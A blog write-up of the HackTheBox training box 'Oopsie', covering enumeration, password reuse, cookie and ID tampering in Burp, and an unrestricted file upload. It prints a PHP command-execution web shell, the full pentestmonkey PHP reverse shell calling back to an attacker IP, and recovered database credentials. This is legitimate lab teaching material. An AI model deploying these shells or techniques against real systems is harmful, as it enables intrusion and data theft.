---
layout: post
title: HackTheBox Write-up &mdash; Oopsie
---

I enumerate the box (which is apparently easy) and get the following.


```
$ bash common/nmap.sh oopsie     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:37 NZDT
Nmap scan report for oopsie (10.10.10.28)
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.53 seconds
```

I go to `http://oopsie:80/` and we see a car-related website with the words `Bringing EV Ecosystem | Robust Design`.  I look at source and see it has an `images` subdomain that I don't have access to.  I can enumerate subdomains using `gobuster` and we find:
```
$ bash common/gobuster.sh 'http://oopsie:80/'
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://oopsie:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/22 20:44:31 Starting gobuster in directory enumeration mode
===============================================================
http://oopsie:80/.htaccess            (Status: 403) [Size: 271]
http://oopsie:80/.htpasswd            (Status: 403) [Size: 271]
http://oopsie:80/css                  (Status: 301) [Size: 298] [--> http://oopsie/css/]
http://oopsie:80/fonts                (Status: 301) [Size: 300] [--> http://oopsie/fonts/]
http://oopsie:80/images               (Status: 301) [Size: 301] [--> http://oopsie/images/]
http://oopsie:80/js                   (Status: 301) [Size: 297] [--> http://oopsie/js/]    
http://oopsie:80/server-status        (Status: 403) [Size: 271]                            
http://oopsie:80/themes               (Status: 301) [Size: 301] [--> http://oopsie/themes/]
http://oopsie:80/uploads              (Status: 301) [Size: 302] [--> http://oopsie/uploads/]
                                                                                            
===============================================================
2021/03/22 20:46:16 Finished
===============================================================
```
But we don't have access to any of these.

Throughout the page's source code, there are references to Hamburgers for some reason.  I think these usually refer to those three stacked bars that are for the menu icon that look like a simplistic hamburger, but this is noted.  Also in the source code I find `http://oopsie/cdn-cgi/login/script.js`, so I go to the subdomain `http://oopsie/cdn-cgi/login/` and I get to a login page.  This login page redirects to `http://oopsie/cdn-cgi/login/index.php`.  My immediate thought is to use SQL injections, because this is what a simple box would probably entail?

We look at the `index.php` code here:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="apple-mobile-web-app-title" content="CodePen">
<title>Login</title>
<link href='/css/1.css' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="/css/font-awesome.min.css">
<link rel="stylesheet" href="/css/normalize.min.css">
<style>
body {
  font-family: "Open Sans", sans-serif;
  height: 100vh;
  background: url("/images/1.jpg") 50% fixed;
  background-size: cover;
}

@keyframes spinner {
  0% {
    transform: rotateZ(0deg);
  }
  100% {
    transform: rotateZ(359deg);
  }
}
* {
  box-sizing: border-box;
}

.wrapper {
  display: flex;
  align-items: center;
  flex-direction: column;
  justify-content: center;
  width: 100%;
  min-height: 100%;
  padding: 20px;
  background: rgba(4, 40, 68, 0.85);
}

.login {
  border-radius: 2px 2px 5px 5px;
  padding: 10px 20px 20px 20px;
  width: 90%;
  max-width: 320px;
  background: #ffffff;
  position: relative;
  padding-bottom: 80px;
  box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.3);
}
.login.loading button {
  max-height: 100%;
  padding-top: 50px;
}
.login.loading button .spinner {
  opacity: 1;
  top: 40%;
}
.login.ok button {
  background-color: #8bc34a;
}
.login.ok button .spinner {
  border-radius: 0;
  border-top-color: transparent;
  border-right-color: transparent;
  height: 20px;
  animation: none;
  transform: rotateZ(-45deg);
}
.login input {
  display: block;
  padding: 15px 10px;
  margin-bottom: 10px;
  width: 100%;
  border: 1px solid #ddd;
  transition: border-width 0.2s ease;
  border-radius: 2px;
  color: #ccc;
}
.login input + i.fa {
  color: #fff;
  font-size: 1em;
  position: absolute;
  margin-top: -47px;
  opacity: 0;
  left: 0;
  transition: all 0.1s ease-in;
}
.login input:focus {
  outline: none;
  color: #444;
  border-color: #2196F3;
  border-left-width: 35px;
}
.login input:focus + i.fa {
  opacity: 1;
  left: 30px;
  transition: all 0.25s ease-out;
}
.login a {
  font-size: 0.8em;
  color: #2196F3;
  text-decoration: none;
}
.login .title {
  color: #444;
  font-size: 1.2em;
  font-weight: bold;
  margin: 10px 0 30px 0;
  border-bottom: 1px solid #eee;
  padding-bottom: 20px;
}
.login button {
  width: 100%;
  height: 100%;
  padding: 10px 10px;
  background: #2196F3;
  color: #fff;
  display: block;
  border: none;
  margin-top: 20px;
  position: absolute;
  left: 0;
  bottom: 0;
  max-height: 60px;
  border: 0px solid rgba(0, 0, 0, 0.1);
  border-radius: 0 0 2px 2px;
  transform: rotateZ(0deg);
  transition: all 0.1s ease-out;
  border-bottom-width: 7px;
}
.login button .spinner {
  display: block;
  width: 40px;
  height: 40px;
  position: absolute;
  border: 4px solid #ffffff;
  border-top-color: rgba(255, 255, 255, 0.3);
  border-radius: 100%;
  left: 50%;
  top: 0;
  opacity: 0;
  margin-left: -20px;
  margin-top: -20px;
  animation: spinner 0.6s infinite linear;
  transition: top 0.3s 0.3s ease, opacity 0.3s 0.3s ease, border-radius 0.3s ease;
  box-shadow: 0px 1px 0px rgba(0, 0, 0, 0.2);
}
.login:not(.loading) button:hover {
  box-shadow: 0px 1px 3px #2196F3;
}
.login:not(.loading) button:focus {
  border-bottom-width: 4px;
}

footer {
  display: block;
  padding-top: 50px;
  text-align: center;
  color: #ddd;
  font-weight: normal;
  text-shadow: 0px -1px 0px rgba(0, 0, 0, 0.2);
  font-size: 0.8em;
}
footer a, footer a:link {
  color: #fff;
  text-decoration: none;
}
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script src="/js/prefixfree.min.js"></script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<div class="wrapper">
<form class="login" action="/cdn-cgi/login/index.php" method="POST">
<p class="title">Log in</p>
<input type="text" placeholder="Username" name="username" autofocus />
<i class="fa fa-user"></i>
<input type="password" name="password" placeholder="Password" />
<i class="fa fa-key"></i>
<button>
<i class="spinner"></i>
<span class="state">Log in</span>
</button>
</form>
</p>
</div>
<script src="/js/min.js"></script>
<script id="rendered-js">
var working = false;
$('.login').on('submit', function (e) {
  e.preventDefault();
  if (working) return;
  working = true;
  var $this = $(this),
  $state = $this.find('button > .state');
  $this.addClass('loading');
  $state.html('Authenticating');
  setTimeout(function () {
    $this.addClass('ok');
    $state.html('Welcome back!');
    setTimeout(function () {
      $state.html('Log in');
      $this.removeClass('ok loading');
      working = false;
    }, 4000);
  }, 3000);
});
//# sourceURL=pen.js
    </script>
</body>
</html>
```

So we see that there is a `pen.js` subdomain/file after `index.php`.  

While searching for ways to penetrate using `pen.js`, I found [this seemingly useful resource](https://www.exploit-db.com/papers/12871).  

We have recently completed the Archetype starting box, and I got a nudge from Reddit to think about stuff from there.  So I try username `admin` and the admin password for that box: `MEGACORP_4dm1n!!`.  Indeed, it works and we are faced with a repair management system admin page.

![_config.yml]({{ site.baseurl }}/images/oopsie-admin.png)

Clicking on the Uploads tab, it says we need *super* admin rights... 

![_config.yml]({{ site.baseurl }}/images/oopsie-super-admin.png)

Now clicking on the Accounts tab, we are faced with a table with one admin user!

<table align="center">
	<thead>
		<tr>
			<td>Access ID</td>
			<td>Name</td>
			<td>Email</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>34322</code></td>
			<td>admin</td>
			<td><code>admin@megacorp.com</code></td>
		</tr>
	</tbody>
</table>

Given that it has an ID, I am curious what happens if we intercept the Uploads request.  Using Burp Suite, we get the following:
```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Host: oopsie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=accounts&id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=34322; role=admin
Connection: close
```

So that one-row table seems to be us?  But we need `superadmin` rights.  So I change `role=superadmin` but still the same error.  I also tried `role=super%20admin`, `role=super-admin`, and `role=super admin`, but no luck.  Worth a try.

Now to the Branding tab, we see another one-row table:
<table align="center">
	<thead>
		<tr>
			<td>Brand ID</td>
			<td>Model</td>
			<td>Price</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>10</code></td>
			<td><code>MC-1123</code></td>
			<td>$110,240</td>
		</tr>
	</tbody>
</table>

Though it probably won't come up, note that they are not from certain parts of Europe, as they are using a numerical comma indicitive of a separator, not a decimal point (cars wouldn't be as low as $110).

Now onto the Clients page:

<table align="center">
	<thead>
		<tr>
			<td>Client ID</td>
			<td>Name</td>
			<td>Email</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>1</code></td>
			<td>Tafcz</td>
			<td><code>john@tafcz.co.uk</code></td>
		</tr>
	</tbody>
</table>

I am most interested in the Accounts tab, as I hope that the table shows more if you have different request cookies or query parameters.  This is what we intercept:
```
GET /cdn-cgi/login/admin.php?content=accounts&id=1 HTTP/1.1
Host: oopsie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=34322; role=admin
Connection: close
```

The request parameters are `content=accounts` and `id=1`.  We could perhaps try different `id`s.  I try `id=2` and get an empty page&mdash;but not an error!  This is good.  Perhaps a certain ID/parameter combination lets me see different accounts.  Let's look for the super admin!  To do this, we can use Burp's Intruder tab (<kbd>&#8984;</kbs> + <kbd>I</kbd>).  Going into the Positions sub-tab, delete the curly symbols around everything except the `id`, so it should look like this:
```
GET /cdn-cgi/login/admin.php?content=accounts&id=§§ HTTP/1.1
Host: oopsie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=34322; role=admin
Connection: close

```

(Keep the attack type as Sniper).  Now go into the Payloads sub-tab.  We want to populate the "Payload Opions [Simple list]" section.  We can generate a list of 1000 IDs to start with:
```bash
for i in $(seq 1 1000); do echo "$i"; done | pbcopy # or
julia -e '[println(i) for i in 1:1000]' | pbcopy # etc
```

Now paste it into the aforementioned section.  Click on the Options tab and ensure that we "Always" Follow Redirections.  Also select the option to "Process cookies in redirections".

Going back to the Target tag, we can now press Start attack.  We slowly see the responses coming through, their lengths and their statuses, etc.  We look for any irregularities.  

Immediately, (well, after waiting a little), we see that `id=30` produces a different length to all the others.  Going back to Repeater [note: sending something from Proxy to Repeater, you can use the <kbd>&#8984;</kbs> + <kbd>R</kbd> shortcut], we change ID=30, and we see 

<table align="center">
	<thead>
		<tr>
			<td>Access ID</td>
			<td>Name</td>
			<td>Email</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>86575</code></td>
			<td>super admin</td>
			<td><code>superadmin@megacorp.com</code></td>
		</tr>
	</tbody>
</table>

Now I think we can try what we were trying before with the Uploads intercept!  Intercepting the Uploads request and sending to Repeater, we change 
```
user=34322; role=admin
```
to
```
user=86575; role=super admin
```

And show response in browser for easy access.  We can upload a file!  This is excellent, because we have done Remote Code Execution (RCE) before.  Let's put in a simple display script, so that our request looks like this:
```
POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
Host: oopsie
Content-Length: 401
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://oopsie
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxCPwDzmeB8D1ILNO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=86575; role=super admin
Connection: close

------WebKitFormBoundaryxCPwDzmeB8D1ILNO
Content-Disposition: form-data; name="name"

evil
------WebKitFormBoundaryxCPwDzmeB8D1ILNO
Content-Disposition: form-data; name="fileToUpload"; filename="display.php"
Content-Type: text/php

<html><head><title>Display a file</title></head>
<body>
<? echo system("cat ".$_GET[’file’]); ?>
</body></html>
------WebKitFormBoundaryxCPwDzmeB8D1ILNO--
```

This uploaded successfully (which is good, because they haven't checked for file extensions!).

Recall that we say an `uploads` directory from `gobusters` earlier!  Let's try uploading a reverse shell PHP file on:

```
POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
Host: oopsie
Content-Length: 6371
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://oopsie
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQG5MQDvEzdbIdQ1i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=86575; role=super admin
Connection: close

------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
Content-Disposition: form-data; name="name"

evil2
------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
Content-Disposition: form-data; name="fileToUpload"; filename="php-reverse-shell.php"
Content-Type: text/php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.82';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
------WebKitFormBoundaryQG5MQDvEzdbIdQ1i--
```

We upload this as `php-reverse-shell.php`.  Now we run the classic `nc6 -nlvp 1234` in one tab, and in another, run `curl http://oopsie/uploads/php-reverse-shell.php`.  In the listener tab, we have a reverse shell!

Now we are in, let's see where we are and what is here:
```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ pwd
pwd
/var/www/html/cdn-cgi/login
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We log in as our friend Bob to actually run the executable:
```bash
$ su robert
su: must be run from a terminal
```

Okay, well we can do some tricks to the web shell to make it a little nicer:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Note: since completing this box, I have found another way of doing this:
```bash
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

Now that we have a terminal, we can login as Robert, using the above credentials:
```bash
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
robert@oopsie:/$ cd home
cd home
robert@oopsie:/home$ ls
ls
robert
robert@oopsie:/home$ cd robert
cd robert
robert@oopsie:~$ ls
ls
cat  LinEnum.sh  user.txt
robert@oopsie:~$ cat user.txt
cat user.txt
f2c7************************7981
```

And we have the user flag!  But I also notice an attractive-looking shell script in there...let's run it and see:
```bash
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Wed Apr  7 12:36:19 UTC 2021


### SYSTEM ##############################################
[-] Kernel information:
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
oopsie


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Fri Sep 11 11:51:24 +0000 2020
robert           pts/2    10.10.14.78      Wed Apr  7 11:55:03 +0000 2021


[-] Who else is logged on:
 12:36:19 up  6:54,  0 users,  load average: 0.09, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup),1000(robert)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon) groups=1(daemon)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
uid=111(mysql) gid=114(mysql) groups=114(mysql)


[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root   root   4.0K Jan 23  2020 .
drwxr-xr-x 24 root   root   4.0K Jan 27  2020 ..
drwxr-xr-x  6 robert robert 4.0K Apr  7 10:24 robert


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_LOG_DIR=/var/log/apache2
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home
INVOCATION_ID=c0eef43780d741b89e1f43df94a8e65d
APACHE_LOCK_DIR=/var/lock/apache2
XDG_SESSION_ID=c5
USER=robert
PWD=/home/robert
HOME=/home/robert
JOURNAL_STREAM=9:19025
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
MAIL=/var/mail/robert
SHELL=/bin/bash
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=3
LOGNAME=robert
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
drwxr-xr-x 2 root root  4096 Jan 27  2020 /bin
drwxr-xr-x 2 root root 12288 Jan 27  2020 /sbin
drwxr-xr-x 2 root root 36864 Jan 28  2020 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 24  2018 /usr/games
drwxr-xr-x 2 root root  4096 Aug  5  2019 /usr/local/bin
drwxr-xr-x 2 root root  4096 Aug  5  2019 /usr/local/games
drwxr-xr-x 2 root root  4096 Aug  5  2019 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Jan 27  2020 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/bin/rbash
/bin/dash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
